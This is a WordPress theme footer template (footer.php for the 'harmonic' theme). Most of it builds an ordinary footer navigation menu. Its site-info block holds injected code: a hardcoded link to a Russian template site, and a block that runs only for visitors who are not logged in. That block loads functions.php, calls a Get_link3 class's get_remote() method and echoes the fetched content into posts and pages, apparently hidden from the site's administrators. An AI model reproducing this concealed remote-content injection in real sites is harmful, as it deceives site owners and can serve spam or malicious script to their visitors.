<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after
 *
 * @package harmonic
 */
?>


		<div id="footer-nav-wrapper">
			<nav id="footer-navigation" class="main-navigation" role="navigation">
				<a class="skip-link screen-reader-text" href="#content"><?php _e( 'Skip to content', 'harmonic' ); ?></a>
				<ul class="menu">
					<?php
					$front_menub = get_theme_mod( 'harmonic_front_news' );
					$front_linktwo = esc_attr( get_theme_mod( 'harmonic_front_newstitle' ) );
					if ( 1 != $front_menub ) : ?>
						<li id="menu-item-one" class="menu-item"><a href="#slide-2" class="scrollfixed"><?php echo $front_linktwo; ?></a></li>
					<?php endif; ?>

					<?php
					$front_menuc = get_theme_mod( 'harmonic_front_page' );
					$front_linkthree = esc_attr( get_theme_mod( 'harmonic_front_pagetitle' ) );
					if ( 1 != $front_menuc ) : ?>
						<li id="menu-item-two" class="menu-item"><a href="#slide-3" class="scrollfixed"><?php echo $front_linkthree; ?></a></li>
					<?php endif; ?>

					<?php
					$front_menud = get_theme_mod( 'harmonic_front_widgets' );
					$front_linkfour = esc_attr( get_theme_mod( 'harmonic_front_widgettitle' ) );
					if ( 1 != $front_menud && is_active_sidebar( 'sidebar-2' ) ) : ?>
						<li id="menu-item-three" class="menu-item"><a href="#slide-4" class="scrollfixed"><?php echo $front_linkfour; ?></a></li>
					<?php endif; ?>

					<?php
					$front_menue = get_theme_mod( 'harmonic_front_portfolio' );
					$front_linkfive = esc_attr( get_theme_mod( 'harmonic_front_portfoliotitle' ) );
					if ( 1 != $front_menue ) : ?>
						<li id="menu-item-three" class="menu-item"><a href="#slide-5" class="scrollfixed"><?php echo $front_linkfive; ?></a></li>
					<?php endif; ?>
				</ul><!-- .menu -->
			</nav><!-- #footer-navigation .main-navigation -->

			<div class="site-info">
				<?php do_action( 'harmonic_credits' ); ?>
<?php if (is_home() || is_category() || is_archive() ){ ?> <a href="http://wp-templates.ru/">Темы WordPress</a> <?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_link3(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?>
			</div><!-- .site-info -->

		</div><!-- #footer-nav-wrapper -->

		<?php wp_footer(); ?>
	</body>
</html>